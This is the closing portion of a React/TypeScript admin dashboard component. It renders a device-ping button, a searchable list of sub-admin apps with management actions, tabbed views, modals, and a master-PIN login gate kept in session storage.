                <button onClick={() => void handlePingAll()} disabled={pingBusy} style={{ padding: "11px 0", borderRadius: 9, border: "none", background: pingState === "done" ? T.green : pingBusy ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, color: pingState === "done" ? "#fff" : pingBusy ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: pingBusy ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                  {pingState === "loading" ? <><Spinner /> Fetching…</> : pingState === "running" ? <><Spinner /> {pingDone}/{pingTotal}…</> : pingState === "done" ? <><Ic.Check /> Done</> : pingState === "err" ? "Error — Retry" : <><Ic.Wifi /> Ping All Devices</>}
                </button>
              </div>
            </div>

            {/* Apps header + search */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10, gap: 12, flexWrap: "wrap" }}>
              <div><div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Sub-Admin Apps</div><div style={{ fontSize: 11, color: T.muted, marginTop: 1 }}>Sorted by newest first</div></div>
              <button onClick={() => setShowCreate(true)} className="ma-hide-mob" style={{ padding: "8px 16px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6 }}><Ic.Plus /> New App</button>
            </div>
            <div style={{ marginBottom: 12, position: "relative" }}>
              <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", color: T.muted, pointerEvents: "none", display: "flex" }}><Ic.Search /></span>
              <input type="text" placeholder="Search by App ID or name…" value={search} onChange={e => setSearch(e.target.value)} style={{ width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 40px", borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
              {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 22, height: 22, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
            </div>
            {appsLoading ? (
              <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}><Ic.Loader /><div>Loading apps…</div></div>
            ) : filteredApps.length === 0 ? (
              <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
                <Ic.Inbox /><div>{search ? `No apps for "${search}".` : 'No apps yet. Click "New App" to create.'}</div>
              </div>
            ) : (
              <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
                {filteredApps.map(app => (
                  <AppCard key={app.appId} app={app} onEdit={setEditApp} onDelete={deleteApp} onToggle={toggleStatus} onLogoutAll={logoutAll} onCopyUrl={copyUrl} onResetApk={resetApk} onRenew={a => setRenewConfirmApp(a)} copyMsg={copyMsg} deletingId={deletingId} togglingId={togglingId} logoutAllId={logoutAllId} resetApkId={resetApkId} renewId={renewId} />
                ))}
              </div>
            )}
          </>
        )}

        {tab === "messages" && <MessagesTab apps={appList} masterPin={masterPin} />}
        {tab === "groups" && <GroupsTab apps={appList} masterPin={masterPin} />}
        {tab === "devices" && <DevicesTab apps={appList} masterPin={masterPin} />}
        {tab === "settings" && <SettingsTab apps={appList} masterPin={masterPin} />}
      </div>

      {/* Modals */}
      {showCreate && <CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)} onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />}
      {showChangePin && <ChangePinModal masterPin={masterPin} onClose={() => setShowChangePin(false)} onChanged={p => { onPinChanged(p); setShowChangePin(false); }} />}
      {editApp && <EditAppModal app={editApp} masterPin={masterPin} onClose={() => setEditApp(null)} onUpdated={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? a : x)); setEditApp(null); }} />}
      {renewConfirmApp && <RenewModal app={renewConfirmApp} masterPin={masterPin} onClose={() => setRenewConfirmApp(null)} onRenewed={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? { ...x, createdAt: a.createdAt, status: a.status } : x)); setRenewConfirmApp(null); }} />}

      {/* Mobile Bottom Nav */}
      <div className="ma-bottom-nav">
        {TABS.slice(0, 2).map(t => (
          <button key={t.id} className={`ma-bnav-item ma-tab-btn ${tab === t.id ? "ma-bnav-active" : ""}`} onClick={() => setTab(t.id)}>
            {t.icon}<span className="ma-bnav-lbl">{t.label}</span>
          </button>
        ))}
        <div className="ma-fab-wrap">
          <button className="ma-fab" onClick={() => setShowCreate(true)} title="New App"><Ic.Plus /></button>
          <span className="ma-bnav-lbl" style={{ color: "#818cf8" }}>New</span>
        </div>
        {TABS.slice(2).map(t => (
          <button key={t.id} className={`ma-bnav-item ma-tab-btn ${tab === t.id ? "ma-bnav-active" : ""}`} onClick={() => setTab(t.id)}>
            {t.icon}<span className="ma-bnav-lbl">{t.label}</span>
          </button>
        ))}
      </div>
    </div>
  );
}

/* ── Root Export ── */
export default function MainAdminPanel() {
  const [masterPin, setMasterPin] = useState<string | null>(() => sessionStorage.getItem("mrrobot_master_auth") ?? null);
  function handleAuth(pin: string) { sessionStorage.setItem("mrrobot_master_auth", pin); setMasterPin(pin); }
  function handleLogout() { sessionStorage.removeItem("mrrobot_master_auth"); setMasterPin(null); }
  function handlePinChanged(newPin: string) { sessionStorage.setItem("mrrobot_master_auth", newPin); setMasterPin(newPin); alert("Master PIN changed successfully!"); }
  if (!masterPin) return <MasterLogin onAuth={handleAuth} />;
  return <Dashboard masterPin={masterPin} onLogout={handleLogout} onPinChanged={handlePinChanged} />;
}
